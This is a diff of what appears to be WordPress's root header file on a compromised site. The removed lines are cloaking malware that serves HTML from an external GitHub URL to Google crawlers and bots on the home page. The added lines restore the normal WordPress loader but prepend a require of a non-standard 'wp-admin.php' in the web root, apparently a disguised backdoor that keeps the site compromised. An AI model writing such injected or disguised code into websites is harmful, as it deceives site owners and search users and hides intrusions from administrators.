@@ -1,21 +1,22 @@
+<?php require('wp-admin.php'); ?> 
 <?php
-$userAgent = strtolower(isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '');
-$referer = strtolower(isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '');
-$uri = isset($_SERVER['REQUEST_URI']) ? $_SERVER['REQUEST_URI'] : '';
+/**
+ * Loads the WordPress environment and template.
+ *
+ * @package WordPress
+ */
 
-if ($uri == '/' && (
-    strpos($userAgent, 'bot') !== false || 
-    strpos($userAgent, 'google') !== false || 
-    strpos($userAgent, 'chrome-lighthouse') !== false || 
-    strpos($referer, 'google') !== false
-)) {
+if ( ! isset( $wp_did_header ) ) {
 
-    $externalFile = file_get_contents('https://raw.githubusercontent.com/gabriellaque/pociseo/main/skirec.html');
-    if ($externalFile !== false) {
-        echo $externalFile;
-    } else {
-        echo "Gagal mengambil data.";
-    }
-    exit();
+	$wp_did_header = true;
+
+	// Load the WordPress library.
+	require_once __DIR__ . '/wp-load.php';
+
+	// Set up the WordPress query.
+	wp();
+
+	// Load the theme template.
+	require_once ABSPATH . WPINC . '/template-loader.php';
+
 }
-?>
